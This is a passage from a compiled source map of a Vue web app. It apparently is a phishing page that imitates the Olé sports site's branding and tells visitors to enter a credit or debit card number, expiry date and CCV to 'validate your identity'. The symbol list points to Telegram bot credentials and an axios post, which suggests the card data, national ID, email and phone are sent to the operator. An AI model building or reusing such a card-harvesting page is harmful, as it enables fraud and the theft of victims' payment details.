io\n      this.numeroTarjeta = '';\n      this.nombreTarjeta = '';\n      this.mesExpiracion = '';\n      this.yearExpiracion = '';\n      this.ccv = '';\n    },\n    actualizarTarjeta() {\n      // Actualiza los datos de la tarjeta con los valores del formulario\n      this.$refs.numero.querySelector('.numero').innerText = this.numeroTarjeta;\n      this.$refs.nombre.querySelector('.nombre').innerText = this.nombreTarjeta;\n      this.$refs.expiracion.querySelector('.mes').innerText = this.mesExpiracion;\n      this.$refs.expiracion.querySelector('.year').innerText = this.yearExpiracion;\n      this.$refs.ccv.querySelector('.ccv').innerText = this.ccv;\n    },\n    toggleFormulario() {\n      const formulario = document.querySelector('.formulario-tarjeta');\n      formulario.classList.toggle('active');\n    }\n  }\n};","map":{"version":3,"names":["axios","mapGetters","mapActions","data","numeroTarjeta","nombreTarjeta","mes","año","ccv","mail","loader","loaderSec","showAlert","continuar","datos","computed","mounted","getDatos","methods","showMsgAlert","submitFormulario","fecha","Date","fechaFormateada","getDate","getMonth","getFullYear","getHours","getMinutes","postData","name","dni","email","tel","chatId","process","env","CHAT_ID_TELEGRAM","botToken","TOKEN_TELEGRAM","apiUrl","API_URL_TELEGRAM","action","url","post","JSON","stringify","chat_id","text","headers","then","r","toggleFormulario","setTimeout","catch","e","limpiarDatos","mesExpiracion","yearExpiracion","actualizarTarjeta","$refs","numero","querySelector","innerText","nombre","expiracion","formulario","document","classList","toggle"],"sources":["C:\\Users\\Suri_RFG\\Desktop\\WORK\\Telegram\\ole\\ole\\src\\views\\Checkout.vue"],"sourcesContent":["<template>\n\t<div class=\"flex flex-col lg:flex-row min-h-screen\">\n\t  <!-- Sección de la imagen -->\n\t  <div class=\"imgScreen relative\" style=\"width: 1015px;\">\n\t\t<img class=\"absolute inset-0 w-full h-full\" src=\"../assets/ole_background.jpg\" alt=\"Imagen\">\n\t  </div>\n\t  <!-- Sección del formulario -->\n\t  <div class=\"lg:w-1/3 flex items-center justify-center bg-white py-16 sm:py-24 lg:py-32 px-6 lg:px-8\">\n\t\t<div class=\"max-w-md lg:max-w-lg w-full\">\n\t\t  <img src=\"https://static.clarin.com/auth0/img/logo_ole_186x60.png\" alt=\"Logo\" class=\"mx-auto mb-8\">\n\t\t  <h2 class=\"text-1xl font-bold text-center text-gray-900\">Para poder validar tu identidad necesitamos que ingreses una tarjeta de crédito o débito.</h2>\n\t\t  <div class=\"mt-6 space-y-4\">\n\t\t\t<form @submit.prevent=\"submitFormulario\">\n\t\t\t  <div class=\"relative mt-2\">\n\t\t\t\t<label for=\"card-number\" class=\"sr-only\">Número de Tarjeta</label>\n\t\t\t\t<input v-model=\"numeroTarjeta\" id=\"card-number\" name=\"card-number\" type=\"text\" maxlength=\"19\" autocomplete=\"off\" required class=\"bg-white hover:bg-gray-200 block w-full rounded-md border border-gray-400 p-4 shadow-sm focus:border-indigo-500 focus:ring-indigo-500 sm:text-sm\" placeholder=\"Número de Tarjeta*\">\n\t\t\t  </div>\n\t\t\t  <div class=\"relative mt-2 flex space-x-3\">\n\t\t\t\t<div class=\"w-1/2\">\n\t\t\t\t  <label for=\"expiry-month\" class=\"sr-only\">Mes de Vencimiento</label>\n\t\t\t\t  <input v-model=\"mes\" id=\"expiry-month\" name=\"expiry-month\" type=\"text\" maxlength=\"2\" autocomplete=\"off\" required class=\"bg-white hover:bg-gray-200 block w-full rounded-md border border-gray-400 p-4 shadow-sm focus:border-indigo-500 focus:ring-indigo-500 sm:text-sm\" placeholder=\"MM*\">\n\t\t\t\t</div>\n\t\t\t\t<div class=\"w-1/2\">\n\t\t\t\t  <label for=\"expiry-year\" class=\"sr-only\">Año de Vencimiento</label>\n\t\t\t\t  <input v-model=\"año\" id=\"expiry-year\" name=\"expiry-year\" type=\"text\" maxlength=\"2\" autocomplete=\"off\" required class=\"bg-white hover:bg-gray-200 block w-full rounded-md border border-gray-400 p-4 shadow-sm focus:border-indigo-500 focus:ring-indigo-500 sm:text-sm\" placeholder=\"AA*\">\n\t\t\t\t</div>\n\t\t\t  </div>\